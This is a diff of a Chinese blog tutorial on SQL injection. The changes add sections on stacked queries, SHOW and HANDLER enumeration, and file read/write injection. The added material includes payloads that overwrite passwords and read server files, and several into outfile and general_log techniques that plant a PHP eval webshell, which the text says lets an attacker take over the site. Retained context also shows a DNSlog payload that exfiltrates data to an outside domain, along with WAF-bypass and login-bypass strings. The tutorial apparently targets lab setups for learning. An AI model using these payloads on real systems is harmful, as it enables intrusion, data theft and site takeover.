@@ -10,7 +10,7 @@
 <meta property='og:description' content="学无止境">
 <meta property='og:url' content='https://blog.928330.xyz/p/sql%E6%B3%A8%E5%85%A5%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/'>
 <meta property='og:site_name' content='kakahuote'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='SQL' /><meta property='article:published_time' content='2025-07-02T00:52:02&#43;08:00'/><meta property='article:modified_time' content='2025-07-02T01:28:30&#43;08:00'/>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='SQL' /><meta property='article:published_time' content='2025-07-02T00:52:02&#43;08:00'/><meta property='article:modified_time' content='2025-07-09T21:25:59&#43;08:00'/>
 <meta name="twitter:title" content="SQL注入：从入门到入土">
 <meta name="twitter:description" content="学无止境">
     <link rel="shortcut icon" href="/favicon.ico" />
@@ -442,21 +442,58 @@
             </li>
           </ol>
         </li>
-        <li><a href="#4-堆叠注入">#4 堆叠注入</a></li>
-        <li><a href="#5-dnslog注入">#5 DNSlog注入</a>
+        <li><a href="#4-堆叠注入">#4 堆叠注入</a>
+          <ol>
+            <li><a href="#普通多语句注入">普通多语句注入</a></li>
+            <li><a href="#show查询">show查询</a>
+              <ol>
+                <li><a href="#查询数据库名称">查询数据库名称</a></li>
+                <li><a href="#查询数据库中的所有表">查询数据库中的所有表</a></li>
+                <li><a href="#查看表的字段">查看表的字段</a></li>
+                <li><a href="#查看创建表的语句">查看创建表的语句</a></li>
+              </ol>
+            </li>
+            <li><a href="#handler查询">handler查询</a>
+              <ol>
+                <li><a href="#打开句柄">打开句柄</a></li>
+                <li><a href="#查看第一行数据">查看第一行数据</a></li>
+                <li><a href="#查看下一行数据">查看下一行数据</a></li>
+                <li><a href="#查看某一行数据">查看某一行数据</a></li>
+                <li><a href="#关闭句柄">关闭句柄</a></li>
+              </ol>
+            </li>
+          </ol>
+        </li>
+        <li><a href="#5-文件读写注入">#5 文件读写注入</a>
+          <ol>
+            <li><a href="#前提">前提</a></li>
+            <li><a href="#文件读取">文件读取</a></li>
+            <li><a href="#普通文件写入">普通文件写入</a>
+              <ol>
+                <li><a href="#union-select">union select</a></li>
+                <li><a href="#lines-terminated-by">lines terminated by</a></li>
+                <li><a href="#lins-starting-by">lins starting by</a></li>
+                <li><a href="#fields-terminated-by">fields terminated by</a></li>
+                <li><a href="#columns-terminated-by">columns terminated by</a></li>
+              </ol>
+            </li>
+            <li><a href="#日志文件写入">日志文件写入</a></li>
+          </ol>
+        </li>
+        <li><a href="#6-dnslog注入">#6 DNSlog注入</a>
           <ol>
             <li><a href="#准备dnslog平台">准备DNSlog平台</a></li>
             <li><a href="#构造注入payload">构造注入Payload</a></li>
           </ol>
         </li>
-        <li><a href="#6-http请求注入">#6 http请求注入</a>
+        <li><a href="#7-http请求注入">#7 http请求注入</a>
           <ol>
             <li><a href="#getpost请求注入">GET/POST请求注入</a></li>
             <li><a href="#http头部参数注入">http头部参数注入</a></li>
             <li><a href="#cookie注入">cookie注入</a></li>
           </ol>
         </li>
-        <li><a href="#7-二次注入">#7 二次注入</a></li>
+        <li><a href="#8-二次注入">#8 二次注入</a></li>
       </ol>
     </li>
     <li><a href="#绕过waf">绕过WAF</a>
@@ -521,7 +558,12 @@
           </ol>
         </li>
         <li><a href="#8-正则表达式绕过">#8 正则表达式绕过</a></li>
-        <li><a href="#9-多参数请求拼凑">#9 多参数请求拼凑</a></li>
+        <li><a href="#9-多参数请求绕过双输入表单">#9 多参数请求绕过（双输入表单）</a>
+          <ol>
+            <li><a href="#绕过间隔代码">绕过间隔代码</a></li>
+            <li><a href="#万能密码">万能密码</a></li>
+          </ol>
+        </li>
       </ol>
     </li>
     <li><a href="#sqlmap使用">SqlMap使用</a>
@@ -621,7 +663,7 @@
 
 
                <time>
-                   更新时间：2025-07-02
+                   更新时间：2025-07-09
                </time>
            </div>
         <div>
@@ -717,14 +759,14 @@
           <td><strong>数据查询与拼接</strong></td>
           <td><code>group_concat()</code></td>
           <td>MySQL, SQLite</td>
-          <td><strong>将多行结果合并成一个字符串一行显示</strong>，用于一次性列出所有表名/列名</td>
+          <td><strong>纵向将多行结果合并成一个字符串一行显示</strong>，用于一次性列出所有表名/列名</td>
           <td><code>' union select 1,group_concat(table_name) from information_schema.tables #</code></td>
       </tr>
       <tr>
           <td></td>
           <td><code>concat()</code> 或 <code>concat_ws()</code></td>
           <td>MySQL</td>
-          <td>将多个字符串或列连接成一个，<strong>但是不改变行数</strong>，用于拼接用户名和密码等字段</td>
+          <td>**横向将多个字符串或列连接成一个，但是不改变行数，**用于拼接用户名和密码等字段</td>
           <td><code>' union select 1,concat(username,':',password) from users #</code></td>
       </tr>
       <tr>
@@ -753,7 +795,8 @@
 <p><mark><strong>关于注释：</strong></mark></p>
 <p><strong>&ndash; 是官方的注释，后面必须跟空格</strong></p>
 <p><strong># 是mysql特有的注释，后面无需跟空格</strong></p>
-<p><strong>有的网站会过滤空格导致&ndash;报错，这时候可以使用&ndash;+，用+代替空格</strong></p>
+<p><mark><strong>如果直接在url中注入而非输入框，需要使用%23代替#，因为浏览器会把#后面内容截断，而非编码</strong></mark></p>
+<p><mark><strong>有的网站会过滤空格导致&ndash;报错，这时候可以使用&ndash;+，用+代替空格</strong></mark></p>
 <p><strong>以上方法不一定全部适用，需要结合实际情况尝试</strong></p></blockquote>
 <p><strong>基于这种思路，只要我们能够测试注入成功，使得页面不出现语法报错，那么就可以借此判断出类型：</strong></p>
 <div class="table-wrapper"><table>
@@ -956,6 +999,19 @@
   </tbody>
 </table></div>
 <p>同样借此获取users表的字段：</p>
+<pre tabindex="0"><code>1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and table_schema=database()#
+</code></pre><p><img src="http://picture.928330.xyz/typora/image-20250706113907039.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250706113907039"
+	
+	
+></p>
+<p>这样就得到了users表的所有的列名称</p>
+<p><strong>这里要注意的是，除了指定表名之外，还要指定数据库名，否则就会出现很多不属于这个表的列名：</strong></p>
 <pre tabindex="0"><code>1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; #
 </code></pre><p><img src="http://picture.928330.xyz/typora/image-20250626144509634.png"
 	
@@ -967,7 +1023,6 @@
 	
 	
 ></p>
-<p>这样就得到了users表的所有的列名称</p>
 <h3 id="7获取字段信息">7.获取字段信息
 </h3><p><strong>知道了表名和列名，就能轻松获取对应信息了</strong></p>
 <p>比如我想获取所有用户的id名称和对应密码：</p>
@@ -1358,17 +1413,179 @@ XPATH syntax error: &#39;~b882cf99~&#39;
 </code></pre><p><strong>如果<code>ascii(substring(database(),1,1))=100</code>为<mark>真</mark>，那么运算式就是<code>pow(1+1,99999)</code>,也就是2^99999^，就会报错</strong></p>
 <h2 id="4-堆叠注入">#4 堆叠注入
 </h2><p>有些应用服务执行sql使用的不是<code>mysqli_query()</code>,而是<code>mysqli_multi_query()</code>方法，可以做到执行多条sql语句</p>
-<p><strong>如果又恰好没有过滤<code>;</code>，我们就能使用<code>;</code>分割语句，利用sql语句进行各种操作：</strong></p>
+<h3 id="普通多语句注入">普通多语句注入
+</h3><p><strong>如果又恰好没有过滤<code>;</code>，我们就能使用<code>;</code>分割语句，利用sql语句进行各种操作：</strong></p>
 <pre tabindex="0"><code>1&#39; union select 1,2;update users set password=123 where id=1--+
-</code></pre><p>这样就篡改了密码，可以随便进入sql啦</p>
-<h2 id="5-dnslog注入">#5 DNSlog注入
+</code></pre><p>这样就篡改了密码</p>
+<p><strong>但能使用堆叠注入的场景一般都对语句做了过滤，尤其是select这样的核心查询语句，我们需要用别的来代替</strong></p>
+<h3 id="show查询">show查询
+</h3><h4 id="查询数据库名称">查询数据库名称
+</h4><div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">show</span> <span style="color:#e06c75">databases</span>;
+</span></span></code></pre></div><h4 id="查询数据库中的所有表">查询数据库中的所有表
+</h4><div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">show</span> <span style="color:#e06c75">tables</span> <span style="color:#c678dd">from</span> 数据库名;
+</span></span></code></pre></div><h4 id="查看表的字段">查看表的字段
+</h4><div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">show</span> <span style="color:#e06c75">columns</span> <span style="color:#c678dd">from</span> 表名;
+</span></span></code></pre></div><p>或者：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">describe</span> 表名;
+</span></span></code></pre></div><p>或者：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">desc</span> 表名;
+</span></span></code></pre></div><h4 id="查看创建表的语句">查看创建表的语句
+</h4><div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">show</span> <span style="color:#c678dd">create</span> <span style="color:#c678dd">table</span> 表名;
+</span></span></code></pre></div><h3 id="handler查询">handler查询
+</h3><p><strong>handler是mysql特有的语句，他可以通过句柄来访问表</strong></p>
+<p><strong>句柄相当于一个指针</strong></p>
+<h4 id="打开句柄">打开句柄
+</h4><div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">handler</span> 表名 <span style="color:#c678dd">open</span>;
+</span></span></code></pre></div><h4 id="查看第一行数据">查看第一行数据
+</h4><div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">handler</span> 表名 <span style="color:#c678dd">read</span> <span style="color:#c678dd">first</span>;
+</span></span></code></pre></div><h4 id="查看下一行数据">查看下一行数据
+</h4><div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">handler</span> 表名 <span style="color:#c678dd">read</span> <span style="color:#c678dd">next</span>;
+</span></span></code></pre></div><p>如果不适用first，直接使用next，效果等同于first</p>
+<h4 id="查看某一行数据">查看某一行数据
+</h4><div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">handler</span> 表名 <span style="color:#c678dd">READ</span> 字段名 <span style="color:#c678dd">KEY</span> (字段值);
+</span></span></code></pre></div><h4 id="关闭句柄">关闭句柄
+</h4><div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">handler</span> 表名 <span style="color:#c678dd">close</span>;
+</span></span></code></pre></div><h2 id="5-文件读写注入">#5 文件读写注入
+</h2><h3 id="前提">前提
+</h3><p><strong>mysql数据库中的<code>secure_file_priv</code>参数指定了数据库导入和导出的安全路径</strong></p>
+<p>该参数可以有三种类型：</p>
+<ul>
+<li>
+<p><strong><code>secure_file_priv=NULL</code></strong>：禁止导入和导出</p>
+</li>
+<li>
+<p><strong><code>secure_file_priv=/</code></strong>：只能在/目录下导入和导出</p>
+</li>
+<li>
+<p><strong><code>secure_file_priv=&quot;&quot;</code></strong> ：不做限制</p>
+</li>
+</ul>
+<p><strong>打开<code>mysql.ini</code>文件，在[mysqld]下修改（如果找不到就添加进去，一般都有）如下：</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#e06c75">secure_file_priv</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#34;&#34;</span>
+</span></span></code></pre></div><img src="http://picture.928330.xyz/typora/image-20250707200427206.png" alt="image-20250707200427206" style="zoom:50%;" />
+<p><strong>重启服务，在命令行登录mysql数据库（找<code>mysql.exe</code>,我的路径是<code>phpStudy\PHPTutorial\MySQL\bin</code>）：</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>mysql -u root -p
+</span></span></code></pre></div><p><strong>如果不知道密码，就在<code>mysql.ini</code>中添加<code>skip-grant-tables</code>，跟上面命令放在一起就行，意思是不需要登录密码</strong></p>
+<p>登录后搜索该参数：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">show</span> <span style="color:#e06c75">variables</span> <span style="color:#c678dd">like</span> <span style="color:#98c379">&#39;%priv%&#39;</span>
+</span></span></code></pre></div><img src="http://picture.928330.xyz/typora/image-20250707201002609.png" alt="image-20250707201002609" style="zoom: 80%;" />
+<p><strong>显示<code>secure_file_priv</code>对应value值为空，说明不做限制了</strong></p>
+<h3 id="文件读取">文件读取
+</h3><p><strong>利用<code>load_file</code>函数能做到对服务器文件的读取：</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">select</span> <span style="color:#e06c75">load_file</span>(<span style="color:#98c379">&#34;D:\\1.txt&#34;</span>);
+</span></span></code></pre></div><p>配合注入语句，我们可以做到读取任意文件（当然前提是页面会有输出）：</p>
+<pre tabindex="0"><code>1&#39; union select 1,load_file(&#39;D:/WWW/1.txt&#39;) #
+</code></pre><p><img src="http://picture.928330.xyz/typora/image-20250707205449502.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250707205449502"
+	
+	
+></p>
+<blockquote>
+<p>注意：</p>
+<p>这里使用的是<code>/</code>，因为<code>\</code>是转义字符，而<code>/</code>在字符串里面没有任何含义</p>
+<p>也可以使用<code>\\</code>，给<code>\</code>转义，让它被当做普通字符处理</p></blockquote>
+<h3 id="普通文件写入">普通文件写入
+</h3><p><strong>利用<code>into outfile</code>可以实现任意内容写入指定位置的文件：</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">select</span> <span style="color:#98c379">&#34;&lt;? evilcode ?&gt;&#34;</span> <span style="color:#c678dd">into</span> <span style="color:#e06c75">outfile</span> <span style="color:#98c379">&#34;D:\\1.txt&#34;</span>;
+</span></span></code></pre></div><p><strong>也可以使用<code>into dumpfile</code>，区别是它只生成一行数据，不会对数据做任何处理（换行等）：</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">select</span> <span style="color:#98c379">&#34;&lt;? evilcode ?&gt;&#34;</span> <span style="color:#c678dd">into</span> <span style="color:#e06c75">dumpfile</span> <span style="color:#98c379">&#34;D:\\1.txt&#34;</span>;
+</span></span></code></pre></div><p><strong>利用这一点，我们可以向服务器上传一句话木马</strong></p>
+<h4 id="union-select">union select
+</h4><p>最常用的写入方式，在select内容中插入一句话木马</p>
+<pre tabindex="0"><code>1&#39; union select 1,&#39;&lt;?php eval($_POST[kaka]); ?&gt;&#39; into outfile &#39;D:/WWW/114514.php&#39; #
+</code></pre><img src="http://picture.928330.xyz/typora/image-20250707205900643.png" alt="image-20250707205900643"  />
+<p>虽然报错，但是文件也写入成功了：</p>
+<img src="http://picture.928330.xyz/typora/image-20250707205828237.png" alt="image-20250707205828237"  />
+<p><strong>接着就可以使用蚁剑等工具接管网站</strong></p>
+<h4 id="lines-terminated-by">lines terminated by
+</h4><p><strong><code>lines terminated by</code>用来定义导出的文件中每行数据以什么字符结尾（默认是换行符 <code>\n</code>）：</strong></p>
+<pre tabindex="0"><code>1&#39; into outfile &#39;D:/WWW/114514.php&#39; lines terminated by &#39;&lt;?php eval($_POST[kaka]); ?&gt;&#39; #
+</code></pre><p><img src="http://picture.928330.xyz/typora/image-20250708141833937.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250708141833937"
+	
+	
+></p>
+<h4 id="lins-starting-by">lins starting by
+</h4><p><strong>与上一种相反，它控制的是每一行开始位置的内容：</strong></p>
+<pre tabindex="0"><code>1&#39; into outfile &#39;D:/WWW/114514.php&#39; lines starting by &#39;&lt;?php eval($_POST[kaka]); ?&gt;&#39; #
+</code></pre><p><img src="http://picture.928330.xyz/typora/image-20250708141731385.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250708141731385"
+	
+	
+></p>
+<h4 id="fields-terminated-by">fields terminated by
+</h4><p><strong><code>fields terminated by</code>控制的是一行数据中，各个字段（列）之间的分隔符：</strong></p>
+<pre tabindex="0"><code>1&#39; into outfile &#39;D:/WWW/114514.php&#39; fields terminated by &#39;&lt;?php eval($_POST[kaka]); ?&gt;&#39; #
+</code></pre><p><img src="http://picture.928330.xyz/typora/image-20250708142123580.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250708142123580"
+	
+	
+></p>
+<h4 id="columns-terminated-by">columns terminated by
+</h4><p><strong>是上一种的同义词，作用完全一样：</strong></p>
+<pre tabindex="0"><code>1&#39; into outfile &#39;D:/WWW/114514.php&#39; columns terminated by &#39;&lt;?php eval($_POST[kaka]); ?&gt;&#39; #
+</code></pre><h3 id="日志文件写入">日志文件写入
+</h3><p>如果mysql无法更改导出文件路径，或者根本不允许导出路径，我们还可以通过日志文件注入</p>
+<p><strong>写入的前提是要开启<code>general log</code>或者<code>slow_query_log</code>模式，并设置目录地址</strong></p>
+<p><strong>下面用<code>general log</code>做演示</strong></p>
+<p><strong>查看配置：</strong></p>
+<pre tabindex="0"><code>show variables like &#39;%general%&#39;
+</code></pre><p><img src="http://picture.928330.xyz/typora/image-20250708165305034.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250708165305034"
+	
+	
+></p>
+<p><strong>开启<code>general log</code>模式：</strong></p>
+<pre tabindex="0"><code>set global general_log = on;   
+</code></pre><p><strong>设置目录地址：</strong></p>
+<pre tabindex="0"><code>set global general_log_file = &#39;D:/WWW/114514.php&#39;;
+</code></pre><p><img src="http://picture.928330.xyz/typora/image-20250708165642906.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250708165642906"
+	
+	
+></p>
+<p><strong>接下来就可以写入一句话木马：</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">select</span> <span style="color:#98c379">&#39;&lt;?php eval($_POST[kaka]); ?&gt;&#39;</span> 
+</span></span></code></pre></div><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20250708170501479.png" alt="image-20250708170501479" style="zoom:67%;" />
+<p><strong>我们输入的木马会被设定的log文件记录，这时候就能用蚁剑连接网站</strong></p>
+<h2 id="6-dnslog注入">#6 DNSlog注入
 </h2><p><strong>DNS在进行域名解析时会留下域名和解析ip的记录(DNSlog)，我们可以利用它显示我们的注入结果</strong></p>
 <p>1.将想要窃取的数据（如数据库名、用户名等）作为这个域名的子域名拼接到查询中</p>
 <p>2.迫使数据库服务器向一个由我们控制的域名发起DNS查询请求</p>
 <p><strong>DNSLOG注入需要有两个条件：</strong></p>
 <ul>
 <li><strong>目标数据库服务器能够向外网发起DNS请求</strong></li>
-<li><strong>开启了<code>LOAD_FILE()</code>读取文件的函数</strong></li>
+<li><strong>开启了<code>load_file()</code>读取文件的函数</strong></li>
 </ul>
 <h3 id="准备dnslog平台">准备DNSlog平台
 </h3><p>网络上有很多公开DNSlog的服务，如www.dnslog.cn，或使用BurpSuite自带的BurpCollaborator</p>
@@ -1384,12 +1601,10 @@ XPATH syntax error: &#39;~b882cf99~&#39;
 	
 ></p>
 <h3 id="构造注入payload">构造注入Payload
-</h3><p>我们需要使用数据库中能够触发网络请求的函数，在MySQL中，最常用的是 <code>load_file()</code>：</p>
+</h3><p>我们需要使用数据库中能够触发网络请求的函数，在MySQL中，最常用的是上文提到过的<code>load_file()</code>：</p>
 <pre tabindex="0"><code>1&#39; and load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.624elh.dnslog.cn\\a&#39;))#
 </code></pre><p>当数据库执行这个Payload时，它会尝试使用<code>load_file()</code>去读取一个网络路径</p>
 <p><code>concat()</code>函数会将各部分拼接起来，构造出一个完整的UNC路径：<code>\\dvwa.624elh.dnslog.cn\a</code></p>
-<blockquote>
-<p><strong>注意，这里使用的是<code>\\</code>，因为需要给<code>\</code>转义，才能让它被当做普通字符处理</strong></p></blockquote>
 <p><strong>为了访问这个网络路径，服务器的操作系统必须先解析主机名 <code>dvwa.624elh.dnslog.cn</code>，因此它会向DNS服务器发起一个DNS查询请求</strong></p>
 <p><strong>回到DNSlog，点击<code>Refresh Record</code>，将会显示出dns解析记录</strong></p>
 <p>这样，数据库名<code>'dvwa'</code>就作为子域名的一部分，被成功地带到了外部，实现了数据泄露：</p>
@@ -1403,11 +1618,11 @@ XPATH syntax error: &#39;~b882cf99~&#39;
 	
 	
 ></p>
-<h2 id="6-http请求注入">#6 http请求注入
+<h2 id="7-http请求注入">#7 http请求注入
 </h2><h3 id="getpost请求注入">GET/POST请求注入
 </h3><p>完整看到这里的你，就会发现上面我们讨论的注入绝大多数都是在GET和POST的场景下</p>
 <p>我们简单句两个例子说明</p>
-<p><mark><strong>GET请求（查询等）：</strong></mark></p>
+<p>==<strong>GET请求（查询等）：</strong>==</p>
 <div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#56b6c2">&lt;?</span><span style="color:#e06c75">php</span>
 </span></span><span style="display:flex;"><span><span style="color:#e06c75">$id</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">$_GET</span>[<span style="color:#98c379">&#39;id&#39;</span>]; 
 </span></span><span style="display:flex;"><span><span style="color:#e06c75">$sql</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#34;SELECT * FROM users WHERE user_id = &#39;&#34;</span> <span style="color:#56b6c2">.</span> <span style="color:#e06c75">$id</span> <span style="color:#56b6c2">.</span> <span style="color:#98c379">&#34;&#39;&#34;</span>;
@@ -1416,7 +1631,7 @@ XPATH syntax error: &#39;~b882cf99~&#39;
 </span></span></code></pre></div><p>我们一般是在查询输入框中输入注入语句，其实也可以在url中：</p>
 <pre tabindex="0"><code>http://example.com/get_vuln.php?id=1&#39; UNION SELECT 1, user, password FROM users#
 </code></pre><p>id后面其实就是我们之前在输入框中输入的内容</p>
-<p><strong><mark>POST请求（登录等）：</mark></strong></p>
+<p><strong>==POST请求（登录等）：==</strong></p>
 <div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#56b6c2">&lt;?</span><span style="color:#e06c75">php</span>
 </span></span><span style="display:flex;"><span><span style="color:#e06c75">$username</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">$_POST</span>[<span style="color:#98c379">&#39;username&#39;</span>];
 </span></span><span style="display:flex;"><span><span style="color:#e06c75">$password</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">$_POST</span>[<span style="color:#98c379">&#39;password&#39;</span>];
@@ -1504,7 +1719,7 @@ XPATH syntax error: &#39;~b882cf99~&#39;
 	
 	
 ></p>
-<h2 id="7-二次注入">#7 二次注入
+<h2 id="8-二次注入">#8 二次注入
 </h2><p>二次注入比较特殊，它用于审查非常严格的情况下，不是窃取数据，而是篡改数据</p>
 <p>我们来看这样一个场景：有一个网站允许用户注册账号，之后可以在个人中心修改自己的密码</p>
 <p><strong>用户注册的php：</strong></p>
@@ -1943,20 +2158,40 @@ XPATH syntax error: &#39;~b882cf99~&#39;
 <p>所以，我们可以在查询语句里面插入换行符绕过：</p>
 <pre tabindex="0"><code>1&#39; union select 1,table_name%0afrom information_schema.tables where table_schema=&#39;dvwa&#39; #
 												 ↑
-</code></pre><h2 id="9-多参数请求拼凑">#9 多参数请求拼凑
-</h2><p>部分表单（比如登录界面）是通过拼凑用户输入的内容来进行查询的，比如：</p>
+</code></pre><h2 id="9-多参数请求绕过双输入表单">#9 多参数请求绕过（双输入表单）
+</h2><h3 id="绕过间隔代码">绕过间隔代码
+</h3><p>部分表单（比如登录界面）是通过拼凑用户输入的内容来进行查询的，比如：</p>
 <div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#e06c75">$param_a</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">$_GET</span>[<span style="color:#98c379">&#39;a&#39;</span>];
 </span></span><span style="display:flex;"><span><span style="color:#e06c75">$param_b</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">$_GET</span>[<span style="color:#98c379">&#39;b&#39;</span>];
-</span></span><span style="display:flex;"><span><span style="color:#e06c75">$sql</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#34;SELECT * FROM products WHERE type = &#39;&#34;</span> <span style="color:#56b6c2">.</span> <span style="color:#e06c75">$param_a</span> <span style="color:#56b6c2">.</span> <span style="color:#98c379">&#34;&#39; AND detail = &#39;&#34;</span> <span style="color:#56b6c2">.</span> <span style="color:#e06c75">$param_b</span> <span style="color:#56b6c2">.</span> <span style="color:#98c379">&#34;&#39;&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">$sql</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#34;SELECT * FROM user WHERE name = &#39;&#34;</span> <span style="color:#56b6c2">.</span> <span style="color:#e06c75">$param_a</span> <span style="color:#56b6c2">.</span> <span style="color:#98c379">&#34;&#39; AND password = &#39;&#34;</span> <span style="color:#56b6c2">.</span> <span style="color:#e06c75">$param_b</span> <span style="color:#56b6c2">.</span> <span style="color:#98c379">&#34;&#39;&#34;</span>;
 </span></span></code></pre></div><p>WAF可能对单个的内容做了过滤，这时候我们就可以把注入语句拆分</p>
 <p>a部分输入：</p>
 <pre tabindex="0"><code>1&#39; union/*
 </code></pre><p>b部分输入：</p>
 <pre tabindex="0"><code>*/select 1,2#
 </code></pre><p>这样拼凑之后的sql语句就是：</p>
-<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">SELECT</span> <span style="color:#56b6c2">*</span> <span style="color:#c678dd">FROM</span> <span style="color:#e06c75">products</span> <span style="color:#c678dd">WHERE</span> <span style="color:#c678dd">type</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#39;1&#39;</span> <span style="color:#c678dd">union</span><span style="color:#7f848e">/*&#39; AND detail = &#39;*/</span><span style="color:#c678dd">select</span> <span style="color:#d19a66">1</span>,<span style="color:#d19a66">2</span><span style="color:#56b6c2">#</span><span style="color:#98c379">&#39;
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">SELECT</span> <span style="color:#56b6c2">*</span> <span style="color:#c678dd">FROM</span> <span style="color:#c678dd">user</span> <span style="color:#c678dd">WHERE</span> <span style="color:#e06c75">name</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#39;1&#39;</span> <span style="color:#c678dd">union</span><span style="color:#7f848e">/*&#39; AND password = &#39;*/</span><span style="color:#c678dd">select</span> <span style="color:#d19a66">1</span>,<span style="color:#d19a66">2</span><span style="color:#56b6c2">#</span><span style="color:#98c379">&#39;
 </span></span></span><span style="display:flex;"><span><span style="color:#98c379">														  		  ~~~~~~~~~~~~~~~~~~~~~~~~~
 </span></span></span></code></pre></div><p>我们就把中间b的部分注释掉了，并且绕过了WAF，成功注入了查询语句</p>
+<h3 id="万能密码">万能密码
+</h3><p><strong>还可以构造出万能密码</strong></p>
+<p>我们使用管理员的账号登录，假设是admin，密码输入：</p>
